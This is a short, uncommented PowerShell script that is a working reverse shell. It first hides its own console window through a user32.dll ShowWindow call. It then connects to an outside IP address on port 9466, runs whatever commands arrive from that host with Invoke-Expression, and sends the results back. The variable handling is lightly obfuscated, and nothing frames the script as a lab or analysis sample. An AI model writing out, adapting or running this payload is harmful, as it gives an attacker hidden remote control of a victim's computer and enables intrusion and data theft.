$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
add-type -name win -member $t -namespace native
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient("23.158.232.33",9466));Set-Variable -Name stream -Value ($client.GetStream());[byte[]]$bytes = 0..65535|%{0};while((Set-Variable -Value ($stream.Read($bytes, 0, $bytes.Length)) -Name i) -ne 0){;Set-Variable -Name data -Value ((New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i));Set-Variable -Value (iex $data 2>&1 | Out-String ) -Name sendback;Set-Variable -Value ($sendback + "PS " + (pwd).Path + "> ") -Name sendback2;Set-Variable -Name sendbyte -Value (([text.encoding]::ASCII).GetBytes($sendback2));$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()   


